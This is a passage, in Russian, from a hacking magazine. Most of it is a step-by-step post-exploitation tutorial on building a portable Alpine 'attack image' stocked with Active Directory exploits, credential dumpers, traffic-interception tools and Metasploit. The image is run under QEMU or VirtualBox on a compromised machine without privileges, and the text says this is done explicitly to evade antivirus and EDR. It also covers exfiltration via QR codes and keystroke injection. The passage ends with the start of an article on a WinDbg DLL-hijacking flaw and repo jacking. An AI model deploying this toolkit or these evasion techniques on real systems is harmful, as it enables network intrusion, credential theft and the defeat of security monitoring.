можно столкнуть ся на практике. В следующей части мы поговорим о том,
как выжить на атакуемой системе без канала эксфильтрации, ког да пивотинг
невозможен и атаки должны развивать ся непосредственно с ата куемой сис-
темы.
COVERSTORY





Если во время пентеста атакующий ока зал-
ся в сис теме, на которой отсутс твует канал
для  эксфиль трации,  отча иваться  рано.
На помощь при дет магия эмуляции и вир-
туализации.  Эти  технологии  поз воляют               s0i37                                                                                       Lead cybersecurity
не толь ко выполнять пивотинг, но и активно              analyst at USSC                                                                                             @s0i37_channel
развивать ата ки, даже если дело поначалу              s0i37@ya.ru
казалось безнадежным.


Пос ле пробития периметра воз можны разные варианты развития атак уже
во внут ренней сети. Ско рее всего, реально нащупать канал передачи данных,
через который мож но предоставить себе уда ленный сетевой дос туп. Тем
не менее бывают ситуации, когда меж ду атакующим и жертвой нет под-
ходящего канала передачи данных — эксфиль трации.
  Дело в том, что далеко не все каналы эксфильтрации пригод ны для проб-
роса соединений и орга низации удаленного доступа. Например, внутренняя
сеть ком пании отре зана от интернета, но на ее рабочие станции могут при-
ходить электронные письма извне. В этом случае стандартные техники
пивотинга неприменимы. Но воз можность приема фай лов сохраня ется,
а вместе с ней сохраняется и возможность развития атак.
  Со сложностями, описанными в этой статье, ты, скорее всего, столкнешь-
ся при анализе защищенности уда ленных рабочих мест: например, наткнув-
шись на какой-нибудь хитрый терминальный RDP-доступ или секьюрно нас-
троенный SSH-шлюз. Как бы то ни было, даже если запивотиться невоз-
можно, отчаиваться рано. Нам нужно идти даль ше и развивать ата ки непос-
редственно со скомпрометированной машины. Здесь нам на помощь вновь
при дет магия эмуляции и виртуали зации.




                      Эта  статья — продол жение публикации  «Вир-
                         туальная магия. Исполь зуем эмуляцию и вир-
                        туали зацию для пивотин га».




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.



ÎÁÐÀÇ ATTACK.IMG (POST_3)

Это тре тий кейс пос тэкс плуатации. У нас нет прав и нет канала эксфильтра-
ции, пригодного для пивотинга. Ата ки пред стоит разворачи вать непосредс-
твен но с атакуемой системы.
  Поскольку развитие атак с адми нистра тив ными при виле гиями — это сво-
его рода частный случай раз вития атак вооб ще, который всегда вклю чает
в себя атаки, выполняемые с уров ня L3, мы спер ва рассмотрим их. Такие ата-
ки не будут тре бовать адми нистра тивных или root-при виле гий.
   Тех ника сетевого доступа с гос тевой ОС в хос товую сеть на скомпромети-
рованной машине та же самая, что в post_1, раз ница лишь в отсутствии тун-
нелей и необходимости развивать ата ку непос редствен но изнутри образа
гос тевой ОС.





  Развитие атак с уров ня L3 — через неп ривилегированные TCP/UDP-
  сокеты NAT-режима

Мы можем не соз давать образ с нуля, а вос пользовать ся любым готовым, тем
же Kali Linux. Однако нужно иметь в виду, что сей час мы рассматриваем ситу-
ации, когда пригод ных каналов эксфильтрации нет, а значит, доставка образа
в несколько гигабайтов может выз вать нешуточные сложности. Мне как-то
доводи лось протаскивать инс трумен тарий через вло жения по электронной
почте множеством кусочков по 5 Мбайт.
  Поэто му будем старать ся разумно использовать дис ковое пространство
и добивать ся минималь ного раз мера финаль ного образа. Ведь сборка
минималистичного  образа,  лишенного  все го  ненужного,  размером
в пару-трой ку сотен мегабайт может оказаться очень кстати.
  Начинаем собирать образ файловой системы. Используем Alpine:


sudo docker pull i386/alpine:3.18
sudo docker run --name attack -it i386/alpine:3.18 /bin/sh

Как ранее с образом GW, мы отталки ваемся от начальной файловой системы
объ емом в 5 Мбайт. На минуточку, 10 Мбайт — это эмулятор, 5 Мбайт —
образ Linux, а в 15 Мбайт у нас помещается готовая рабочая Linux-система,
которую мы можем запускать где угод но, без уста новки и без прав! Неп лохое
начало...
  Для лучшей обратной совмести мости мы исполь зуем 32-битный образ,
более переносимый (он работает в системах x64, но не наобо рот). Этот
образ менее популярен, и оттого установка некото рых пакетов с предкомпи-
лированными файлами под x64 потребует уже перекомпилировать их в x32.
Поэтому нам при дется установить некоторые лишние пакеты. Если же ты
решишь соз дать x64-образ, то установка многих пакетов будет проще и не
пот ребует части зависи мостей.
   Те перь перейдем к наполнению обра за теми утилита ми, которые так
или ина че могут понадобиться нам при раз витии атак во внутренней сети. Тут
все несколь ко субъективно, поэтому я про демонстрирую напол нение attack-
образа хакер ски ми утилита ми на все случаи жизни во внутренней сети
по сво ему вкусу.
   Начнем с жиз ненно необходимых утилит:


apk update
apk add tmux busybox-extras openrc dhclient iptables git curl socat
proxychains-ng openssl tcpdump

По тенциально мы можем столкнуться со сценарием постэкс плуата ции, когда
у нас не будет удобного GUI и нам пот ребуется предварительно автоматичес-
ки настроить сеть в используемом для ата ки образе. Так мы сможем по сети
управлять системой хоть с консоли, хоть с веб-шел ла. Для начала обеспечим
системе автомати ческий выход с нами на связь:


touch /etc/local.d/init.start
chmod +x /etc/local.d/init.start
vi /etc/local.d/init.start
    #!/bin/sh


    dmesg -n 1
    mount -o remount,rw /
    ifconfig lo 127.0.0.1 netmask 255.0.0.0


    #dhclient eth0
    ifconfig eth0 10.0.2.15 netmask 255.255.255.0
    route add -net default gw 10.0.2.2
    busybox-extras telnetd


rc-update add local
passwd root
adduser user
chmod u+s /bin/busybox

Значительная часть арсенала экспло итов инфраструк туры Active Directory
написана на Python, так что ста вим его и его пакетный менеджер:


apk add python3 python3-dev py3-pip

Нам, как ни крути, пот ребуется ком пиляция, поэто му устанав ливаем GCC:


apk add gcc make libc-dev

Размер образа замет но вырос — сразу на 200 Мбайт. И по мере установки
всех необходимых нам пакетов он раздуется аж до 2 Гбайт. Однако в конце,
пос ле сборки всего необходимо го, мы удалим все ненужное.
   Те перь добавим главный хакерский пакет про тив Windows-сис тем, содер-
жащий необходимые многим скрип там биб лиотеки:


apk add rust cargo openssl-dev libffi-dev
pip3 install impacket
rm -r /root/.cargo

Целых 55 Мбайт, но в при дачу к impacket мы получа ем пачку крутых исполня-
емых файлов для удаленного администрирова ния и не толь ко.
  Далее по порядку перейдем к установке ути лит разведки, эксплоитов,
без которых не обойтись, и средств для пос тэкс плуатации — куда без них?
   Что за тестирование на про никновение без ска нирования портов? Ставим
Nmap и его скриптовый движок:


apk add nmap nmap-scripts

С помощью Nmap мы можем не толь ко сканировать порты, но и решать мно-
жество других задач — собирать дополнительные све дения от служб, искать
некоторые уязвимос ти и про водить атаки с под бором пароля. И это обош-
лось нам всего в 25 Мбайт!
  Поскольку основная цель ата ки — домен, тре бует ся инструмент для вза-
имо действия с LDAP. Пакет openldap-clients пре доставля ет ряд нативных ути-
лит поиска (ldapsearch), добавления (ldapadd), изме нения (ldapmodify) и уда-
ления (ldapdelete) объектов и атрибутов в AD, при чем этот инструментарий
весит все го лишь мегабайт:


apk add openldap-clients

При вычный и удобный резолв при помощи  host или  dig будет стоить
нам 6 Мбайт:


apk add bind-tools

А вот основной инструмент разведки, поиска уязвимостей и мисконфигов
в Active Directory:


git clone https://github.com/fox-it/BloodHound.py

Скрипт для сбора все объемлю щей информации о AD обойдется всего
в 1 Мбайт. Его дамп можно будет впос ледс твии выгрузить и про анализи-
ровать уже на своем компьюте ре. Одна ко продвижение по сетям с Active
Directory — это не только анализ мисконфигов, но еще и эксплуатация уяз-
вимос тей, так что перейдем к наиболее акту альным экс плоитам.
   Вот, пожалуй, самый низ ко висящий фрукт в инфраструктуре AD, не тре-
бующий ни учетки, ни наличия IP-адреса и пробива ющий сразу DC:


git clone https://github.com/dirkjanm/CVE-2020-1472 zerologon

Восполь зуем ся край не популярной сейчас темой с так называемы ми при нуж-
дени ями к аутентификации (coerce):


git clone https://github.com/p0dalirius/Coercer
rm -r .git/ documentation/

Техника coerce используется в большом количес тве атак на инфраструктуру
AD для захвата Kerberos-билетов или обхода NTLM-аутентифика ции.
  Правда, в нашем случае имеет место сущес твенное ограниче ние —
у запущенной без прав вир туалки не будет сво его IP-адреса из локаль ной
сети и возможности занять 445-й порт. Однако если мы принудим хост
выполнить под ключение на порт выше 1024, то его реально будет завернуть
на вир туалку без админ ских прав и реализовать в дальнейшем ту или иную
ата ку.
   Если мы исполь зуем coerce в сочета нии с Kerberos, то обязательно берем
с собой сле дующий инстру мент:


git clone https://github.com/dirkjanm/krbrelayx

Не лиш ним будет использовать нашумевшие техники повыше ния привилегий
через ADCS:


pip3 install certipy-ad
git clone https://github.com/dirkjanm/PKINITtools

Еще одна уязвимость постарше, поз воляющая скомпрометировать DC:


git clone https://github.com/dirkjanm/PrivExchange

Не забываем про эксплу атацию ACL-мисконфи гов:


git clone https://github.com/ShutdownRepo/pywhisker && pip3 install
rich
git clone https://github.com/Hackndo/pyGPOAbuse

Также  всег да  полезно  посмотреть  информацию  на  сетевых  дисках
с помощью того же grep или find, например с целью поиска cpassword.
Для монтирова ния удаленной SMB-шары и превращения ее в локальную пап-
ку пот ребуется лишь один пакет:


apk add cifs-utils

Те перь вспомним о тех уяз вимостях непосредственно рабочих станций и сер-
веров, которые чаще всего встречают ся и экс плуатация которых дает наивыс-
ший импакт и не тре бует особых усло вий и уси лий. Сре ди них — уяз вимость
под системы печати Windows:


git clone https://github.com/cube0x0/CVE-2021-1675 PrintNightmare

Уязвимость MS17-010 — это самый низ ко висящий фрукт на рабочих стан циях
и Windows-серверах. Да, уязвимость уже не так молода, но иногда встре чает-
ся в редко обновляемых системах:


git clone https://github.com/3ndG4me/AutoBlue-MS17-010

Пару слов про Linux. Самый простой и наибо лее вероятный способ быстро
ком про метнуть Linux-хост — это подоб рать к нему пароль по SSH, а затем
использовать OpenSSH:


apk add openssh-client

Также на Linux иногда встречается RCE-мисконфиг неограниченного доступа
к X-серверу, эксплуатируемый с помощью xdotool:


apk add xdotool

И про активное сетевое обо рудование тоже не забываем. Это уязвимость
из раз ряда by-design, позволяющая выг рузить кон фиг с Cisco или залить
на него:


git clone https://github.com/frostbits-security/SIETpy3

Ну и напоследок можно немного пошуметь в сети с Nuclei:


wget https://github.com/projectdiscovery/nuclei/releases/download/v3.
2.2/nuclei_3.2.2_linux_386.zip
unzip nuclei_3.2.2_linux_386.zip nuclei -d /usr/local/bin/
git clone https://github.com/projectdiscovery/nuclei-templates ~/
nuclei-templates
rm -r ~/nuclei-templates/.git/

Ес ли пентестеру удастся прод винуть ся по локаль ной сети, то для рас кручива-
ния горизон тального перемещения все же сложно будет обой тись без сле-
дующе го инструментария:


apk add g++ libxml2-dev libxslt-dev jpeg-dev
git clone https://github.com/byt3bl33d3r/CrackMapExec
pip3 install .
rm -r CrackMapExec
rm -r /root/.cargo/
apk del rust cargo libxml2-dev libxslt-dev jpeg-dev

Прав да, объем пакетов составляет 120 Мбайт. Зато вместе с CrackMapExec
будет установлен pypykatz, предназначенный для выдергивания учетных
записей  из дампов процесса lsass.exe прямо на нашей виртуалке.
И lsassy, поз воляющий удаленно рас парсить его пря мо на машине жертвы.
  Кроме того, мы получа ем замеча тель ную LDAP-консоль msldap. Этот инс-
трумент име ет ряд полезных для пентеста функций: например, он единствен-
ный способен под Linux выдать канони чес кие ACL у любых объ ектов AD. Так-
же он под держивает все PTH, PTT и PTC на LDAP. И еще вместе с ним
по зависимостям мы получа ем отличный набор скриптов для манипулиро-
вания Kerberos-билета ми — minikerberos, который прек расно дополняет
impacket. Так что 120 Мбайт — это не такая боль шая плата за полученные
воз можности.
  В ходе бокового перемещения мы неизбежно столкнемся со множеством
хешей. Совсем сла бые пароли мы сможем подоб рать пря мо на нашей вир-
туал ке. Для этого возьмем john:


apk add perl linux-headers libgomp
git clone https://github.com/openwall/john john-src && cd john-src/
src
./configure --disable-simd
make
cd .. && mv run/ /opt/john/
cd .. && rm -r john-src

Наконец, как же обойтись без великого и могучего Metasploit?


git clone https://github.com/rapid7/metasploit-framework
rm -r .git/
apk add ruby ruby-bundler ruby-dev libffi-dev libpq-dev libpcap-dev
ncurses
bundle install

Об рати внимание: удалив служеб ную пап ку .git, мы освободили целый
гигабайт! С помощью Metasploit мы можем не толь ко про изводить операции
пос тэксплуата ции, но и эксплуатировать уязвимос ти, искать их, подбирать
пароли ко мно жеству сервисов, а так же выпол нять качес твенную раз ведку.
   Те перь необходимо организовать передачу данных в пределах скомпро-
метированной машины — меж ду ее хос товой ОС и гостевым образом ОС.
Проще все го это сде лать с помощью FTP-сер вера на Python:


pip3 install pyftpdlib
sudo python3 -m pyftpdlib -p 21

Пос ле это го с помощью обычного провод ника Windows мож но закидывать
файлы на нашу вир туалку или скачивать их с нее.
   Хоть мы и рассматриваем кейс, ког да каналов эксфильтра ции с компьюте-
ра жертвы в нашем распоряжении нет, один канал у нас все вре мя был
перед глазами — это монитор (GUI или консоль). На самом деле впол не
реально  извлечь  небольшие  дампы,  хеши  или  прочую  информацию
с физически изо лирован ного хоста пос редс твом QR-кодов. А для рендера
QR-кодов хватит и кон соли:


git clone https://github.com/s0i37/exfiltrate
gcc -c lib/qrcodegen.c
gcc -c qr_upload.c
gcc qr_upload.c qrcodegen.o -o qr_upload
apk add util-linux

Вполне возможно, что мы что-то забыли положить в образ, нап ример
какой-то скрипт или словарик. Канал инфильтрации у нас тоже все это вре мя
находился перед глазами — это кла виатура. Мы можем автоматически наб-
рать на ней любой файл не очень большого раз мера, будь он текстовым
или бинарным. Для этого будем исполь зовать на стороне атакующего сле-
дующий инс трумент:


git clone https://github.com/s0i37/exfiltrate
setxkbmap us
cat file.txt | ./text_send.sh
cat file.bin | base64 | ./text_send.sh

Таким образом, в самых труд ных ситуациях вынимать фай лы мы сможем
по QR-кодам, а передавать — отправляя нажатия кла виш. Ско рость при этом
будет сопос тавима с DNS-туннелями.
  Пришла пора убрать лишние фай лы, которые тре бовались в процес се
сборки:


pip3 cache purge
apk del make gcc g++ libc-dev python3-dev git linux-headers

Мы освободи ли 460 Мбайт! Кажется, мы всё соб рали. Кто-то наверняка
дополнил бы мой скромный спи сок самых необ ходимых ути лит. А ленивый
и вов се взял бы готовый образ Kali.
  Далее мы прощаем ся с «Докером» и переходим к chroot. Нам потребуется
пре образовать кон тейнер Docker в образ, при год ный для монтирования.
Сперва дампим все фай лы:


sudo docker export attack > attack.tar

При этом дампятся именно файлы, полезные дан ные, а не сама файловая
система. Так все пустоты на диске уйдут.
  Далее создадим диск-образ и перенесем туда файлы:


truncate -s 2G attack.img
fdisk attack.img
 n p w
sudo losetup -o $[2048*512] /dev/loop0 attack.img
sudo mkfs.ext4 /dev/loop0
sudo mount /dev/loop0 /media/iso
cd /media/iso
sudo tar xvf $OLDPWD/attack.tar
sudo mkdir boot
cd -

По ка наш образ недееспособен без «Докера» или chroot. Что бы вдох нуть
в него жизнь, понадо бится ядро. Каких-то требований  к версии ядра,
в общем-то, нет. Мы можем исполь зовать уже собранное ядро для GW-обра-
за. Просто копируем его и его драйверы:


cd /usr/src/linux-5.16.12
sudo make INSTALL_PATH=/media/iso/boot install
sudo make INSTALL_MOD_PATH=/media/iso/ modules_install
cd -

Ядро уместилось в 15 Мбайт.
  Заходим внутрь обра за и соз даем рамдиск, необ ходимый для загрузки
системы:


sudo chroot /media/iso /bin/sh
echo nameserver 8.8.8.8 > /etc/resolv.conf
apk add mkinitfs
mkinitfs -k -o /boot/initrd.img-5.16.12 5.16.12
apk del mkinitfs
exit

Виртуальный диск занял 3 Мбайт. Выходим обратно в свою сис тему.
   Устанав ливаем заг рузчик grub и конфигурируем его:


sudo grub-install --target=i386-pc --boot-directory=/media/iso/boot/
attack.img --modules='part_msdos'      <5M
cat <<E | sudo tee /media/iso/boot/grub/grub.cfg
set timeout=5
menuentry "Alpine Linux" {
 linux /boot/vmlinuz-5.16.12 root=/dev/sda1 rw noapic
 initrd /boot/initrd.img-5.16.12
}
E

Заг рузчик потребовал 5 Мбайт. Образ готов. Отсо единяем его:


sudo umount /media/iso/
sudo losetup -d /dev/loop0

А теперь сож мем образ на максималках для переда чи на машину жертвы:


zip -9 attack.zip attack.img

Несмотря на то что мы задали размер обра за рав ным 2 Гбайт, архиватор
сжал пустоты на диске и внутри файлов, и в резуль тате объ ем готового
боевого образа получился всего 590 Мбайт.


Èñïûòûâàåì Attack.img íà QEMU â Windows (íåò ïðèâèëåãèé, íåò
ýêñôèëüòðàöèè)
Мы уже знаем, как без адми нистративных прав запустить вир туальную
машину. Раньше мы так делали с GW-обра зом. Раз вертывание портативного
боевого плацдарма на винде с созданным нами attack-образом выглядит точ-
но так же — мы просто копиру ем на скомпро метированную машину папку
с QEMU.
  Формат образов QEMU также под держивает сжатие:


qemu-img convert attack.img -c -O qcow2 attack.qcow2

Сжатие дает нам не толь ко выиг рыш в раз мере образа атакующей ОС: с его
помощью мы скрываемся от прос того сиг натурного поиска антивирусом,
а благодаря слою эмуляции прячем ся еще и от поведенческого анализа.
И легко, за пару минут, без всяких прав, на древней Windows XP мы запускаем
Мetasploit, да еще и при работающем анти виру се:


qemu-system-x86_64.exe -hda attack.qcow2 -m 512M -net nic -net user (
-display curses)





       Развертывание боево го плацдарма без прав и под над зором




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ





             ИСПОЛЬЗУЕМ ЭМУЛЯЦИЮ
        И ВИРТУАЛИЗАЦИЮ ПРИ АТАКАХ




Итак, подытожим. Нам не требуют ся адми нис тратив ные при вилегии. Не нужно
ничего устанав ливать — весь необ ходимый софт будет сразу в нашем рас-
поряжении в пор тативном исполне нии. Антивирусы не увидят наши хакерские
инструменты, пос кольку мы используем спе цифичный формат образов,
да еще и со сжатием.
  А исполь зование хакер ского плацдарма за сло ем эмуляции, помимо
удобства и переносимос ти, дает нам еще одно пре имущество — почти вся
наша активность (кро ме сетевой) будет недостижима для EDR-механизмов
жертвы, ведь все происходит внутри образа и не касается WinAPI хостовой
ОС.


Èñïûòûâàåì Attack.img íà qemu-system â Linux (íåò ïðèâèëåãèé,
íåò ýêñôèëüòðàöèè)
С Linux без root-прав мы снова используем QEMU:


./qemu-system-i386 -hda attack.qcow2 -m 512M -net nic -net user,
hostfwd=tcp:127.0.0.1:2323-10.0.2.15:23

Как тебе такое повышение привилегий?





              Развертывание боево го плацдарма без прав

Вместо экстре мального развертывания хакерско го инстру ментария с кучей
библиотек и к тому же без прав мы с ком фортом работаем в заранее заготов-
ленной любимой ОС, запускаемой под слоем эму ляции пос редством пор-
тативной виртуальной машины.
  В комплекте с виртуальной машиной есть еще утилита qemu-img. С ней мы
можем прямо на скомпро метированном узле создать образ еще одного дис-
ка и использовать его как для расширения дискового прос транс тва ата-
кующей ОС, так и для расширения RAM, на случай если компьютер жертвы
име ет очень слабую конфигурацию.


ÎÁÐÀÇ ATTACK.IMG (POST_4)

Идея развития атак при наличии полных прав на скомпро метированной
машине без канала эксфильтрации схожа с post_2 в способе проб роса L2-
доступа внутрь вир туалки. И, как и в случае с post_3, она подразуме вает раз-
витие атак непосредственно изнутри обра за виртуальной машины.





            Развитие атак с уровня L2 — через двой ной bridge

В образе attack.img спе циально отсутствовали все скрипты и программы
для реали зации L2-атак, поскольку мы сперва рассматривали слу чай постэкс-
плуата ции без административных прав или root. Но теперь мы пред полага ем,
что у нас есть такие права.
  До бавим в наш уже готовый образ ряд ути лит для L2-атак. Тут снова мно-
гое индивидуально и зависит от твоей фантазии.
   Удобный кон сольный сетевой сниффер ngrep поможет быстро обна-
ружить в перехватываемом сетевом тра фике ту или иную информацию.
Легитим ная утилита dnsmasq прекрасно умеет работать в роли rogue DNS
сервера. А redsocks идеален для проксирования перехваченного транзитно-
го трафика на спе циали зированные при ложения:


apk add ngrep dnsmasq redsocks

Для уста нов ки следующих ][-ути лит нам вре менно потребуется подключить
дополнительные репозитории Alpine:


echo https://dl-cdn.alpinelinux.org/alpine/edge/testing >> /etc/apk/
repositories
echo https://dl-cdn.alpinelinux.org/alpine/edge/main >> /etc/apk/
repositories
echo https://dl-cdn.alpinelinux.org/alpine/edge/community >> /etc/
apk/repositories
apk update

Основа основ перехвата трафика в локальных сетях — ARP spoong. На мой
взгляд, инструмента удоб нее старого доб рого Ettercap попросту нет:


apk add ettercap

Ес ли с ARP spoong ничего не вый дет, то, воз можно, повезет с вмешатель-
ством в сетевой трафик через IPv6:


pip3 install mitm6

Ес ли рядом с нами окажутся Windows-хосты, то им мало не покажет ся бла-
годаря responder:


apk add responder

Для активных вме шательств в перехватыва емый веб-трафик мы будем
использовать mitmproxy:


apk add mitmproxy

Ну и на всякий случай:


apk add bettercap

Не забываем убрать дополнитель ные репозитории, иначе при последующих
установках пакетов может про изойти нежелатель ный даунгрейд компонентов:


vi /etc/apk/repositories
apk update

На случай если при перехвате трафика нам придется стол кнуться с SSL/TLS,
можно вос поль зовать ся sslsplit:


git clone https://github.com/droe/sslsplit
 apk add libevent-dev libnet-dev fts-dev fts
 make
 gcc ... -lfts

Для выдер гивания фай лов из незашифрован ного сетевого тра фика уста-
новим сле дующий пакет:


wget http://prdownloads.sourceforge.net/tcpxtract/tcpxtract-1.0.1.
tar.gz
 apk add flex-dev
 ./configure
 make
gcc ... -lfl

Ес ли мы вдруг захотим ата ковать SMB-трафик доменных машин, то, воз-
можно, нам повезет с груп повыми полити ками:


git clone https://github.com/whitel1st/GP_Hijack

А при перехвате SSH-тра фика мы можем увидеть plaintext-пароль:


git clone https://github.com/droberson/ssh-honeypot
 apk add libssh-dev json-c-dev
 make

Не которые популяр ные сервисы могут отправ лять пароли по сети. Кто-то
откры тым текстом, кто-то в виде хеша. И то и дру гое — ценная информация
для нас. Сле дующая тулза отлично извлекает эту информацию из перехвачен-
ного трафика:


git clone https://github.com/DanMcInerney/net-creds
pip2 install scapy==2.3.1

Но вот незадача, нам нужен Python 2. Его выпилили из всех современных дис-
трибутивов, поэтому поставим Python 2 из исходни ков:


wget https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tgz
 apk add zlib-dev openssl-dev
 ./configure
 make
 make install
rm -r Python-2.7.18
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py

Ну и наконец, что, если мы будем ата ковать адми нов, перехватывая их трафик
по SMB и внедряя в их список фай лов на сетевом диске RCE-ярлыки?


apk add openssl-dev libnfnetlink-dev libnetfilter_queue-dev
git clone https://github.com/quickbreach/SMBetray
 pip2 install impacket==0.9.24
 pip2 install -r requirements.txt

Готово, мы добави ли в наш образ небольшой инстру ментарий для L2-атак.


Èñïûòûâàåì Attack.img íà VirtualBox â Windows (åñòü ïðèâèëåãèè,
íåò ýêñôèëüòðàöèè)
Архитектура QEMU не очень удобна для орга низации сетевых мос тов
в Windows. В слу чае если перед нами ском прометированная Windows,
на которой у нас имеются права администратора, для раз вития сетевых атак
нуж но вер нуться к уже знакомой VirtualBox.
  Скры тую уста нов ку VirtualBox с бриджингом сетей host и guest мы уже рас-
смот рели в пре дыду щей статье. Отличий в плане запуска практичес ки никаких
нет. Разве что если pivot-канал отсутствует, то более целесообразно запус-
кать виртуалку с GUI, ведь развивать дальнейшие ата ки мы будем прямо
с нее:


c:\post\vboxmanage startvm linux





   Ведем ата ки прямо с машины жертвы — принуждаем к аутентификации

Несмотря на то что мы на машине под управлением Windows, мы можем раз-
вивать любые L2-атаки. В этом при мере мы смогли принудить удаленный хост
к аутентифика ции, не погасив 445-й порт на самой скомпрометированной
машине.


Èñïûòûâàåì Attack.img íà qemu-system â Linux (åñòü ïðèâèëåãèè,
íåò ýêñôèëüòðàöèè)
Слу чилось чудо: у нас есть полные права на Linux. Аналогично post_2 брид-
жим сети на хосте:


brctl addbr br0; brctl addif br0 eth0; ifconfig eth0 0 promisc;
ifconfig br0 10.0.0.18 netmask 255.255.255.0; route add -net default
gw 10.0.0.1

Запускаем виртуалку:



  ./qemu-system-i386 -hda attack.img -m 512M -net
  nic,macaddr=00:11:22:33:44:55 -net tap,script=no
  brctl addif br0 tap0
  ifconfig tap0 up


И аналогично post_3 выжимаем все атаки уже из L2-доступа.





    Устраиваем ата ки прямо с машины жертвы — спуфим DNS через IPv6

L2-атаки — это не только ARP или NetBIOS spoong: все, что берет начало
с канального уровня, будет достижимо для атакующей виртуальной машины,
включая и IPv6. И как обычно, без уста нов ки дополнительных пакетов.
  Мы  рассмотрели  восемь  сценари ев  постэксплу атации.  Четыре
под Windows и четыре под Linux, четыре с правами и столько же без прав,
четыре с каналом эксфильтрации и без него — все возможные сочетания
условий, с которы ми мож но столкнуть ся при перехо де с «внешки» во «внут-
рянку».
  Нес мотря на ощутимые раз личия условий, все восемь сце нариев постэкс-
плуата ции име ют одно при меча тельное сходство: в каждом случае был
реали зован единый интерфейс — специально заготовленная ОС, абстра-
гирующая нас от любого окру жения технологи ей эму ляции.
   Все, что угод но, любую прог рамму или скрипт, можно запус тить на любой
ОС и с любыми правами, практически не касаясь файловой системы
на машине жер твы и не уста навливая ни одной допол нительной программы
или пакета.
  И если шиф рование или обфускация — это наиболее универ саль ный спо-
соб уклонения от сигнатурного обнаружения анти вируса, то единс твенное,
что может легко обой ти эвристику и поведенческий анализ, — это виртуали-
зация/эмуляция.


ÂÛÂÎÄÛ

На что способен хакер, когда он может из ничего и без прав создавать целые
миры, полноцен ные операционные сис темы? Полностью абстрагироваться
от окружающей сре ды, ее особен ностей и враждебности, спрятавшись
под сло ем эмуляции. А при наличии прав он может выполнять трюки, которые
не пре дус мотрел ни один безопасник.
  Инфраструктура QEMU просто фантастическая. С ее помощью мож но,
нап ример, сде лать симуляцию в симуля ции — эму лировать текущее железо
прямо в работающей ОС и запустить ее в вир туальной машине, создав аль-
тернатив ную реальность. А потом в эмулято ре запустить еще один эмулятор.
А потом еще и еще, рекурсивно.





        Эмуляция внут ри эмуляции внутри эмуляции — just for fun

Все это ставит под сомнение клас сическую модель пос тэкс плуатации:
«получил права — повышай при вилегии». Ведь практически весь пивотинг,
даже  L3  с  использовани ем  VPN-туннелей,  как  выяснилось,  возможен
без прав и на любой системе. И вмес то вер тикаль ной эскалации при вилегий
(в пре делах одной ОС) нам поч ти всегда будет про ще сделать горизонталь-
ную эскалацию через расширение при сутствия, просто отыскав в сети более
уязвимый хост.
  Мало того что мы запус кали Linux внутри Windows и делали это без прав,
QEMU поз воляет еще и запускать код неродного CPU благодаря трансляции
машинных команд.





                   Без прав и даже на чужом CPU

Это расширяет горизонты применения QEMU в области постэксплуатации
и на других архи тек турах. ОС Linux благода ря файловым системам user-space
(FUSE) в лице того же SSHFS позволяет расширить дис ковое прос транс тво
и сде лать возможным запуск полноцен ной боевой ОС, наподобие нашей,
даже в экзо тичес ких условиях постэкс плуата ции с все го 10 Мбайт свобод-
ного прос транства. Например, на  IP-камерах или прочих  устройствах,
перепол ненных раз личны ми уязвимос тями, которые могут стать отличной
точкой опоры и дальнейшего прод вижения.
  Воз можности эмуляции сегод ня не зна ют границ. Например, вот пол-
ноценная ОС, запущенная внутри бра узера на чистом JavaScript.





                Фабрис Беллар и тут был пер вым

Отличная демонстра ция того, что эмуляция спо собна творить чудеса. Но это,
наверное, уже тема для следующей статьи.
  Мой друг Caster так же, как и я, на про тяжении нескольких лет развивал
тему экс тремального пивотинга с помощью виртуализации — с его иссле-
дованиями ты можешь ознакомиться в опубликован ных ранее статьях. А еще
можешь пос мотреть его увлекательный доклад на OFFZONE.
ВЗЛОМ





Сегодня мы с тобой пройдемся по пос-
ледним трендам в ИБ, пос мотрим, какие
новые идеи занима ют умы специалистов
                                                                         Денис Макрушин
                                                                                       Специализируетсяпо безопас ности (в том чис ле моей коман-                                                                                      на исследовании угроз
                                                                                 и разработке технологийды) и какие пуб ликации на эту тему можно                                                                               защиты от целевых атак.
                                                                                         @makrushinпочитать.




Де нис Макрушин — выпускник факультета информационной безопас ности
НИЯУ МИФИ и там же продолжает делить ся опытом со студентами сво ей аль-
ма-матер. Также Денис выс тупа ет научным руководителем для сту дентов раз-
ных ведущих кафедр и факультетов стра ны в области информационной
безопасности и защиты информации.



ÀÒÀÊÈ ÍÀ ÐÀÇÐÀÁÎÒ×ÈÊÀ: ÓßÇÂÈÌÎÑÒÜ Â ÎÒËÀÄ×ÈÊÅ WINDBG

Нач ну с иссле дова ния, которое про вела наша команда Advanced Research
Team. Мы обнаружи ли интересную особен ность в WinDbg, штатном средстве
отладки Windows. Эта особенность дает возможность запускать произволь-
ный вре доносный код на хос те раз работчика и подменять библиотеки.
  Не самый известный факт, но формат отладочных символов PDB позволя-
ет разработчикам снабжать исполня емые фай лы не толь ко кодовы ми сим-
волами и структурами, но и информацией о мес тонахождении соответству-
юще го исходно го кода. Механизм носит название SrcSrv, и из-за некоррек-
тной обработки его нас троек атакующий может переопре делить путь к рас-
ширениям WinDbg и проводить атаку DLL Hijacking для подключения про-
извольных DLL, в том числе DLL, расположенных на удаленном SMB-сервере.
  Поверхность ата ки:
 1. Атака может затронуть окружение разработ чика или аналитика, который
   работает над приложением для Windows.
 2. Штатный отладчик не обновляется авто мати чески, поэтому потребуется
   ручное обновле ние — это усложня ет процесс исправ ления.
 3. Воз можные  пос ледствия:   утечка  интеллектуальной  собственности
   или ком про метация исходного кода разрабатываемого ПО.

В Microsoft подтвер дили наличие уяз вимости и под готови ли исправление
в версии WinDbg 10.0.22621.0 и выше, а также в Windows SDK 11.
  Отчет доступен на англий ском язы ке. Также мы раз работали утилиту,
которая про веряет фай лы дампов и ищет в них ссылки на фай лы PDB.


ÀÒÀÊÈ ÍÀ ÐÀÇÐÀÁÎÒ×ÈÊÀ: ÈÑÑËÅÄÎÂÀÍÈß ÒÅÕÍÈÊÈ REPO
JACKING

Repository hijacking (или Repo Jacking) — ата ка на репозиторий, которая поз-
воля ет получить пол ный контроль над исходными кодами. В резуль тате ата-
кующий может выполнить про извольный код в том контексте, где подклю чает-
ся атакован ный репозиторий.
